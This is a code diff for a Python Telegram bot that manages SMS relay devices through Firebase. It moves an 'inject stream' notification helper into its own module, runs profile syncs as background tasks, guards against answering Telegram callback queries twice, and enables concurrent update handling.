@@ -16,7 +16,12 @@ from app.channel_relay import (
     queue_channel_sms_with_firebase,
     queue_manual_sms_with_firebase,
 )
-from app.firebase_sync import forward_incoming_to_mynum, send_polling_startup_test, sync_profile_to_firebase
+from app.firebase_sync import (
+    forward_incoming_to_mynum,
+    send_polling_startup_test,
+    sync_profile_for_user,
+    sync_profile_to_firebase,
+)
 from app.monitor_timer import cancel_auto_stop, schedule_auto_stop
 from app.device_ui import (
     device_set_keyboard,
@@ -32,7 +37,6 @@ from app.device_ui import (
     format_ping_card,
     format_premium_gate_card,
     format_inject_startup_card,
-    format_inject_stream_card,
     format_send_queued,
     format_sim_selected_card,
     format_status_card,
@@ -52,6 +56,7 @@ from app.license_keys import (
     list_key_devices,
     publish_license_key,
 )
+from app.telegram_notify import send_inject_stream_dm
 from app.services import (
     device_status,
     get_active_device,
@@ -165,31 +170,6 @@ async def _deliver_monitoring_started(
         await _pin_monitoring_message(bot, chat_id, sent.message_id)
 
     await bot.send_message(chat_id=chat_id, text=startup_card, parse_mode="HTML")
-
-
-async def send_inject_stream_dm(
-    telegram_user_id: int,
-    sender: str,
-    message: str,
-    relay_ms: int = 3,
-) -> None:
-    """Astik-style [STREAM] card — owner DM only."""
-    if not settings.telegram_bot_token:
-        return
-
-    from telegram import Bot
-
-    bot = Bot(token=settings.telegram_bot_token)
-    stream_card = format_inject_stream_card(
-        sender,
-        message,
-        queued_ms=relay_ms or 3,
-        total_ms=(relay_ms or 3) + 1,
-    )
-    try:
-        await bot.send_message(chat_id=telegram_user_id, text=stream_card, parse_mode="HTML")
-    except Exception as exc:
-        logger.error("Inject stream DM failed for %s: %s", telegram_user_id, exc)
 
 
 async def notify_new_sms(sms: SMSMessage) -> None:
@@ -1262,21 +1242,28 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
     data = query.data
     db: Session = SessionLocal()
+    answered = False
 
     try:
         if data.startswith("sim:"):
             _, device_id, sim_index = data.split(":")
+            await query.answer("⏳ SIM select ho raha hai...")
+            answered = True
+
             device = db.query(Device).filter(Device.id == int(device_id)).first()
             if not device:
-                await query.answer("Device nahi mili", show_alert=True)
+                try:
+                    await query.edit_message_text("❌ Device nahi mili", parse_mode="HTML")
+                except Exception:
+                    pass
                 return
+
             if device.firebase_source_url:
                 device = await sync_device_from_firebase(db, device)
             profile = select_sim_slot(db, user.id, int(sim_index))
             db.commit()
-            await sync_profile_to_firebase(profile, device)
+            asyncio.create_task(sync_profile_for_user(user.id))
             active = get_selected_sim(device, int(sim_index))
-            await query.answer(f"SIM {active.get('slot', int(sim_index) + 1)}: {active.get('number', '?')}")
             await query.edit_message_text(
                 format_sim_selected_card(device, profile.selected_sim_index or 0),
                 parse_mode="HTML",
@@ -1286,15 +1273,17 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
         if data.startswith("stop:") or data == "monitor:stop":
             await query.answer()
+            answered = True
             profile = stop_monitoring(db, user.id)
             device = get_active_device(db, user.id)
             cancel_auto_stop(user.id)
-            await sync_profile_to_firebase(profile, device)
+            asyncio.create_task(sync_profile_for_user(user.id))
             await query.edit_message_text(format_stop_card(), parse_mode="HTML")
             return
 
         if data.startswith("monitor:start:"):
             await query.answer("⏳ Monitoring start...")
+            answered = True
             try:
                 await query.edit_message_text(
                     "⏳ <b>Monitoring start ho raha hai...</b>\nAPK config + inject test",
@@ -1307,7 +1296,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
                 profile, device, ignored, inject_total_ms = await _activate_monitoring(db, user.id)
             except ValueError as exc:
                 hint = _monitoring_start_error_hint(str(exc))
-                await query.answer(hint, show_alert=True)
                 try:
                     await query.edit_message_text(f"❌ <b>ERROR</b>\n\n{hint}", parse_mode="HTML")
                 except Exception:
@@ -1330,9 +1318,14 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
         if data == "monitor:on":
             await query.answer("Monitoring ON button use karo", show_alert=False)
+            answered = True
     except Exception as exc:
         logger.error("Callback error: %s", exc)
-        await query.answer(f"Error: {exc}", show_alert=True)
+        if not answered:
+            try:
+                await query.answer(f"Error: {exc}", show_alert=True)
+            except Exception:
+                pass
     finally:
         db.close()
 
@@ -1342,7 +1335,12 @@ def build_telegram_app() -> Application | None:
         logger.warning("TELEGRAM_BOT_TOKEN not set; Telegram bot disabled")
         return None
 
-    app = Application.builder().token(settings.telegram_bot_token).build()
+    app = (
+        Application.builder()
+        .token(settings.telegram_bot_token)
+        .concurrent_updates(True)
+        .build()
+    )
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("help", help_command))
     app.add_handler(CommandHandler("guide", guide_command))
